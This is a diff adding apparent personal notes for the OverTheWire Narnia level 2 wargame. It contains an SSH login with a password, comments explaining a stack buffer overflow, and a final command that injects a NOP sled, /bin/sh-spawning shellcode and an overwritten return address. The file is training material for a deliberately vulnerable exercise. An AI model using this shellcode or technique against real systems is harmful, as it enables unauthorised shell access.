@@ -1,0 +1,14 @@
+ssh narnia2@narnia.labs.overthewire.org -p 2226
+nairiepecu
+[look at source]
+[another buffer overflow!]
+[but this time, we have to manipulate the return address that is used after the main function terminates]
+[lets enter the shell code into the buffer, add a lot of random stuff and then a pointer to the begin of the buffer]
+[distance from begin of buffer to start of return address is 128 bytes + 4 byte for frame pointer + 4 byte for return address]
+[using gdb magic, we can see that this works!]
+[problem, gdb changes the length of the stack a little bit - env variables etc]
+[so we got to use ltrace to find the start of the buffer]
+[x90 is NOP, a command that is just skipped - this can be used to increase the possible range of addresses that lead to execution of the shell code]
+[important: this only works because memory randomization is disabled]
+
+./narnia2 $(echo -en "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xe8\xd5\xff\xff")
